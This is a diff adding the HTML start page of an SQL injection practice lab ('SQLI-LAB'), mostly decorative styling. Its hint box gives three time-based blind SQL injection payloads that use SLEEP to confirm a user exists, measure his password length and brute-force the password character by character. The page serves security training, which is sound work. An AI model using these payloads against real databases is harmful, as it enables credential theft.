@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>home</title>
+    <style>
+        :root {
+            --mika-pink: #FFC0CB;
+            --mika-deep: #F48FB1;
+            --nagisa-gold: #D4AF37;
+            --nagisa-tea: #FFF8E1;
+            --seia-orange: #FFCC80;
+            --seia-deep: #FB8C00;
+            --trinity-white: #FAFAFA;
+            --text-elegant: #5D4037;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Georgia', 'Times New Roman', serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #FFF0F5 0%, #E3F2FD 100%);
+            overflow: hidden;
+            color: var(--text-elegant);
+        }
+
+        body::before, body::after {
+            content: "🪶";
+            position: absolute;
+            top: -10%;
+            font-size: 20px;
+            color: rgba(255, 255, 255, 0.6);
+            text-shadow: 0 0 5px rgba(255, 192, 203, 0.5);
+            animation: feather-fall 10s linear infinite;
+            z-index: -1;
+        }
+        body::after {
+            left: 70%;
+            animation-duration: 15s;
+            animation-delay: 2s;
+            font-size: 30px;
+        }
+
+        .feather-extra {
+            position: absolute;
+            top: -10%;
+            color: rgba(255, 255, 255, 0.8);
+            animation: feather-fall 12s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes feather-fall {
+            0% { transform: translateY(0) rotate(0deg) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            100% { transform: translateY(110vh) rotate(360deg) translateX(50px); opacity: 0; }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 50px 60px;
+            border-radius: 15px;
+            border: 1px solid white;
+            outline: 4px double var(--nagisa-gold); 
+            outline-offset: -10px;
+            box-shadow: 0 20px 50px rgba(212, 175, 55, 0.2), 0 0 0 10px rgba(255, 255, 255, 0.5);
+            text-align: center;
+            max-width: 550px;
+            width: 90%;
+            position: relative;
+            backdrop-filter: blur(5px);
+            animation: float-in 1s ease-out;
+        }
+
+        @keyframes float-in {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .container::before {
+            content: '✦';
+            font-size: 2em;
+            color: var(--nagisa-gold);
+            position: absolute;
+            top: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #FFF0F5;
+            padding: 0 15px;
+            border-radius: 50%;
+            box-shadow: 0 0 15px var(--nagisa-gold);
+        }
+
+        h1 {
+            font-size: 2.2em;
+            margin-bottom: 30px;
+            font-weight: normal;
+            letter-spacing: 2px;
+            background: linear-gradient(to right, var(--mika-pink), var(--nagisa-gold));
+            background-clip: text;     
+            -webkit-background-clip: text;
+            color: transparent;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.05);
+        }
+
+        h1 span {
+            display: block;
+            font-size: 0.5em;
+            color: #888;
+            margin-top: 5px;
+            font-style: italic;
+            letter-spacing: 1px;
+        }
+
+        a.btn-less, button.btn-hint {
+            display: block;
+            width: 100%;
+            padding: 15px 0;
+            margin: 15px 0;
+            font-family: 'Georgia', serif;
+            font-size: 1.1em;
+            text-decoration: none;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 1px;
+        }
+
+        .btn-less {
+            background: linear-gradient(135deg, var(--mika-pink), #F8BBD0);
+            color: white;
+            box-shadow: 0 5px 15px rgba(255, 192, 203, 0.6);
+            border: 1px solid white;
+        }
+
+        .btn-less::before {
+            content: '✨';
+            position: absolute;
+            left: 20px;
+            opacity: 0;
+            transition: 0.3s;
+            transform: scale(0.5);
+        }
+
+        .btn-less:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(255, 192, 203, 0.8);
+            background: linear-gradient(135deg, var(--mika-deep), var(--mika-pink));
+        }
+
+        .btn-less:hover::before {
+            opacity: 1;
+            transform: scale(1.2);
+        }
+
+        .btn-hint {
+            background: linear-gradient(135deg, var(--nagisa-tea), #FFF);
+            color: var(--text-elegant);
+            border: 1px solid var(--nagisa-gold);
+            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.2);
+        }
+
+        .btn-hint::before {
+            content: '☕';
+            position: absolute;
+            left: 20px;
+            opacity: 0;
+            transition: 0.3s;
+        }
+
+        .btn-hint:hover {
+            transform: translateY(-3px);
+            background: var(--nagisa-gold);
+            color: white;
+            box-shadow: 0 8px 20px rgba(212, 175, 55, 0.5);
+        }
+
+        .btn-hint:hover::before {
+            opacity: 1;
+        }
+
+        #hint-content {
+            display: none;
+            margin-top: 25px;
+            padding: 25px;
+            background: #FFFAF0;
+            border-left: 4px solid var(--seia-orange);
+            border-radius: 0 10px 10px 0;
+            text-align: left;
+            position: relative;
+            box-shadow: inset 0 0 20px rgba(255, 204, 128, 0.2);
+            animation: unfold 0.6s ease-out;
+        }
+
+        @keyframes unfold {
+            from { opacity: 0; max-height: 0; transform: perspective(600px) rotateX(-10deg); }
+            to { opacity: 1; max-height: 500px; transform: perspective(600px) rotateX(0); }
+        }
+
+        #hint-content::after {
+            content: '🐦';
+            position: absolute;
+            top: -15px;
+            right: 10px;
+            font-size: 1.5em;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        code {
+            background: white;
+            border: 1px solid #EEE;
+            color: #E65100;
+            font-family: 'Consolas', monospace;
+            border-radius: 4px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+    </style>
+    
+    <script>
+        function toggleHint() {
+            var hint = document.getElementById("hint-content");
+            var btn = document.getElementById("hint-btn");
+            
+            if (hint.style.display === "block") {
+                hint.style.display = "none";
+                btn.innerHTML = "Show Hint";
+            } else {
+                hint.style.display = "block";
+                btn.innerHTML = "Close Hint";
+            }
+        }
+    </script>
+</head>
+<body>
+
+<div class="feather-extra" style="left: 20%; animation-delay: 0s;">🪶</div>
+<div class="feather-extra" style="left: 50%; animation-delay: 5s;">🪶</div>
+<div class="feather-extra" style="left: 80%; animation-delay: 3s;">🪶</div>
+
+<div class="container">
+    <h1>
+        SQLI-LAB
+        <span>JACK SECURITY FLATFORM</span>
+    </h1>
+
+    <a href="Less-9/" class="btn-less" target="_blank">
+        Start Mission 
+    </a>
+    
+    <button id="hint-btn" class="btn-hint" onclick="toggleHint()">
+        Show Hint
+    </button>
+
+    <div id="hint-content">
+
+        <div style="margin-bottom: 15px; border-bottom: 2px solid var(--seia-orange); padding-bottom: 5px;">
+            <span style="background: var(--seia-orange); color: white; padding: 2px 8px; border-radius: 4px; font-size: 0.8em;">GUIDE</span> 
+            <strong style="color: var(--text-elegant); font-size: 1.1em;">Wick's Tips:</strong>
+        </div>
+
+        <div style="
+            background: rgba(255, 204, 128, 0.2); 
+            border: 1px dashed var(--seia-deep); 
+            padding: 10px; 
+            border-radius: 5px; 
+            margin-bottom: 20px; 
+            color: #8D6E63; 
+            font-size: 0.95em;
+        ">
+            <strong style="color: var(--seia-deep);">Notice:</strong> 
+            無論輸入什麼，顯示的輸出都是一樣的
+        </div>
+
+        <div style="margin-bottom: 15px;">
+            <div style="font-size: 0.95em; font-weight: bold; color: #8D6E63; margin-bottom: 6px;">
+                I. 確定 Jack 存在
+            </div>
+            <code style="display: block; padding: 10px; border-left: 3px solid var(--seia-orange);">
+                1' AND IF((SELECT COUNT(*) FROM users WHERE username='jack')=1, SLEEP(5), 0)#
+            </code>
+        </div>
+
+        <div style="margin-bottom: 15px;">
+            <div style="font-size: 0.95em; font-weight: bold; color: #8D6E63; margin-bottom: 6px;">
+                II. 確定 Jack 密碼的長度
+            </div>
+            <code style="display: block; padding: 10px; border-left: 3px solid var(--seia-orange);">
+                1' AND IF((SELECT LENGTH(password) FROM users WHERE username='jack')=1, SLEEP(5), 0)#
+            </code>
+        </div>
+
+        <div style="margin-bottom: 15px;">
+            <div style="font-size: 0.95em; font-weight: bold; color: #8D6E63; margin-bottom: 6px;">
+                III. 爆破出密碼
+            </div>
+            <code style="display: block; padding: 10px; border-left: 3px solid var(--seia-orange);">
+                1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='jack')='a',SLEEP(5),0)#
+            </code>
+        </div>
+
+        <div style="margin-top: 15px; font-size: 0.8em; color: #AAA; font-style: italic; text-align: left;">
+            "有些事情，還是親自確認比較好..."
+        </div>
+    </div>
+    
+</div>
+
+</body>
+</html>
